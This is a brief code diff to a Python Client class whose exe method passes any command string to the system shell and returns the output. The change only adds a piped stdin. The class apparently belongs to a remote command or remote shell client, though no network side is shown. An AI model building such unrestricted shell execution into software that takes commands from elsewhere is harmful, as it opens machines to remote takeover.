@@ -71,7 +71,7 @@ class Client(object):
  def exe(self, cmd):
   if cmd.strip() == 'cls':return '-1'
   try:
-   proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+   proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    output = proc[0].decode('utf8')
    errors = proc[1].decode('utf8')
    output = output if output else errors
